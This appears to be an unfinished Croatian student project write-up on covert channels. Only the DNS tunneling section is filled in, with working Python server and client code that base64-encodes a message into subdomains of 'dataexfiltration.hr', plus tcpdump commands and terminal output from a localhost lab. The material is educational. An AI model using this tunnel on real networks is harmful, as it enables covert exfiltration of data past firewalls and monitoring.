# 1. Uvod









# 2. DNS Tunneling - Donat Ricov

Domain Name System protokol, poznat i kao DNS protokol, obuhvaća tehniku za prijenos podataka koji protokolu nisu izvorno namjenjeni. Iako je DNS koristan za prevođenje naziva domena u IP adrese te je kao takav osnovni protokol intereta, ovakva priroda samog protokola čine ga idealnim medijem za zaobilaženje standardnih sigurnosnih politika i stvaranje skirvenih komunikacijskih kanala. To znači da osim što DNS zbog svoje široke primjene može biti korišten u legitimate svrhe, također može biti zlouporabljen u kontekstu kibernetičkih napada kako bi se izvršila neželjena eksfiltracija podataka.

Tipičan primjer zlouporabe DNS protokola obuhvaća scenarij u kojem napadač enkapsulira podatke unutar DNS upita i njegovog odgovora. Ovi podaci mogu obihvaćati bezazlen internet promet i standardne komande, ali može se raditi o povjerljivim sigurnosim podacima. Budući da većina mreža dopušta DNS promet zbog njegove prethodno spomenute široke uporabe, potencijalna zlouporaba često može proći nefiltrirana u odnosu na druge vrste prometa. Potencijalno opasan mrežni promet tako često može zaobići vatrozide i probijati sigurnosne sustave u potpunosti neopaženo. Rezultat ovog je stvoren tunel između kompromitiranog sustava i udaljenog poslužitelja napadača.

Mehanizam rada DNS tunnelinga obično uključuje nekoliko komponenti:

1. Klijent na kompromitiranom uređaju - dio malicioznog softvera koji kodira podatke u oblik prikladan za DNS upite.

2. DNS poslužitelj kontroliran od napadača - konfiguriran za obradu neuobičajenih DNS upita i dekodiranje sadržaja unutar njih.

3. Tunneling protokol - definira način pretvaranja podataka u DNS pakete te njihovu rekonstrukciju na odredištu.

Ovakva struktura, zajedno sa standardizacijom samog DNS-a, su razlog njegove učinkovitosti. DNS nazivi domena imaju definiranu strukturu prema kojoj isti mogu sadržavati samo relativno duge nizove znakova. Ovakva struktura omogućava napadaču prenošenje osjetljivih kodiranih podataka. Ovako DNS upiti prolaze kroz nekoliko poslužitelja što otežava, ili čak onemogućuje, lociranje stvarnog izvora tunnelinga.

<img width="6056" height="2050" alt="image" src="https://github.com/user-attachments/assets/29ece733-e97f-48fa-b4b3-a22080c25a47" />

<p align="center">
  <img src="putanja/do/slike.png" alt="Primjer DNS tunnelinga">
</p>

<p align="center"><em>Slika 1: Primjer DNS tunnelinga</em></p>

Iako je tehnika široko poznada u području mrežne i kibernetičke sigurnosti kao medij zlouporabe informacija, krađu podataka i održavanje zlonamjernih kanala, DNS tunneling ima raširene legitimne primjene. Pojedini administratori su korisnici ove tehnike jer im dopušta omogućavanje ograničenih mrežnih usluga u ograničenim ili čak zatvorenim okruženjima. Ipak, i u ovakvim okruženjima primjena ovakvog pristupa može sa sobom nositi legitiman rizik koji može komprimirati sigurnosne politike mreže.

Uzevši u obzir eklatantan porast uporabe DNS tunnelinga u malicioznim svrhama, moderni sigurnosni sustavi često provide napredne analize DNS prometa, dok mrežni administratori pomno prate potencijalne anomalije u strukturi samog prometa. 

# 2.1. Plan izrade praktičnog dijela

Praktični dio rada temelji se na izgradnji i simulaciji okruženja u kojem se demonstrira način funkcioniranja DNS tunnelinga. U ovoj fazi simulirano je generiranje, prijenos i presretanje samih podataka koji su skriveni unutar legitimnog DNS promjeta. Na ovaj je način demonstrirano kako se u praksi može izgraditi ovakav tunel kojim se prenose podaci putem standardnih DNS mehanizama. Također, evidentirano je kako ovakva vrsta prometa izgleda kada je promatrana kroz alate za analizu mreže. Ovakva vrsta pristupa pruža jasnu ilustraciju koncepta DNS tunnelinga kao i praktični prikaz realnog scenarija napada. Ovo je ključno za razumjevanje tehničke izvedbe napada i njegovog potencijalnog sigurnosnog značaja za sami sustav.

## 2.2. Metode i tehnike rada

Tekst 

## 2.3. Postavljanje radnog okruženja

Tekst

## 2.4. Kod

### 2.4.1. Poslužitelj - dns_server.py

import socket
import base64
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A

def extract_message_from_subdomain(subdomain):
    try:
        return base64.urlsafe_b64decode(subdomain.encode()).decode()
    except Exception as error:
        return f"Error decoding message: {error}"

def process_dns_query(query_data, client_ip):
    parsed_query = DNSRecord.parse(query_data)
    response_record = DNSRecord(DNSHeader(id=parsed_query.header.id, qr=1, aa=1, ra=1), q=parsed_query.q)
    requested_domain = str(parsed_query.q.qname)
    print(f"Received DNS request for: {requested_domain} from {client_ip}")

    if "dataexfiltration.hr" in requested_domain:
        domain_parts = requested_domain.split('.')
        if len(domain_parts) > 2:
            secret_part = domain_parts[0]
            decoded_message = extract_message_from_subdomain(secret_part)
            print(f"Decoded secret: {decoded_message}")
        
        ip_address = "127.0.0.1"
        response_record.add_answer(RR(requested_domain, QTYPE.A, rdata=A(ip_address), ttl=300))
        print(f"Responding with IP: {ip_address}")
    else:
        print(f"Invalid domain query for: {requested_domain}")
    
    return response_record.pack()

def run_dns_server(bind_address="0.0.0.0", bind_port=5354):
    print(f"DNS server is running on {bind_address}:{bind_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        server_socket.bind((bind_address, bind_port))
        while True:
            try:
                query_data, client_address = server_socket.recvfrom(512)
                response_data = process_dns_query(query_data, client_address)
                server_socket.sendto(response_data, client_address)
            except Exception as e:
                print(f"Error during query processing: {e}")

if __name__ == "__main__":
    try:
        run_dns_server()
    except KeyboardInterrupt:
        print("\nDNS server stopped.")

## 2.4.2. Klijent - client.py

import dns.message
import dns.query
import base64

def encode_data_in_subdomain(data, domain):
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    return f"{encoded}.{domain}"

def transmit_dns_tunnel_message(server, domain, message, port=53):
    query_domain = encode_data_in_subdomain(message, domain)
    query = dns.message.make_query(query_domain, dns.rdatatype.A)
    try:
        response = dns.query.udp(query, server, port=port)
        print(f"Message sent: '{message}' as '{query_domain}'")
        print(f"Response:\n{response}")
    except Exception as e:
        print(f"Transmission failed: {e}")

if __name__ == "__main__":
    domain = "dataexfiltration.hr"
    server_ip = "127.0.0.1"
    server_port = 5354

    msg = "Ova poruka je tajna."

    transmit_dns_tunnel_message(server_ip, domain, msg, port=server_port)

## 2.5. Slanje poruke i snimanje prometa

### 2.5.1. tcmdump

Snimio sam pakete koji idu na portu 5354.

sudo tcpdump -i lo udp port 5354 -w dns_tunnel.pcap

Objasnjenje

### 2.5.2. Pokretanje DNS servera

Otvorio sam drugi terminal i u njemu pokrenuo

cd dns_tunnel
python3 dns_server.py

I dobio poruku:

Starting DNS server on 0.0.0.0:5354

### 2.5.3. Pokretanje klijenta i slanje poruke

Otvorio sam treći terminal i pokrenuo:

cd dns_tunnel
python3 client.py

Što je ispisalo:

donat@donat-VirtualBox:~$ cd dns_tunnel
python3 client.py
Message sent: 'Ova poruka je tajna.' as 'T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr'
Response:
id 64216
opcode QUERY
rcode NOERROR
flags QR AA RD RA
;QUESTION
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. IN A
;ANSWER
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. 300 IN A 127.0.0.1
;AUTHORITY
;ADDITIONAL

### 2.5.3. Čitanje tajne poruke

donat@donat-VirtualBox:~/dns_tunnel$ python3 dns_server.py
DNS server is running on 0.0.0.0:5354
Received DNS request for: T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. from ('127.0.0.1', 41631)
Decoded secret: Ova poruka je tajna.
Responding with IP: 127.0.0.1

### 2.5.4. Zaustavljanje tcpdump-a

Kada sam zaustavio tcpdump dobio sam 

^C2 packets captured
4 packets received by filter
0 packets dropped by kernel
donat@donat-VirtualBox:~$ ^C

Te sam dobio datoteku dns_tunnel.pcap.

### 2.6. Analiza prometa u Wiresharku









































## 2.2. Steganografija - Lana Maček

## 2.3. Covert timing channels - Marin Vabec

## 2.4. SMTP - Dino Primorac
